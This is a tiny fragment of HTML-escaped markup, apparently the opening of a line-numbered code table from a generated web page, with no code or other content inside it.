 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
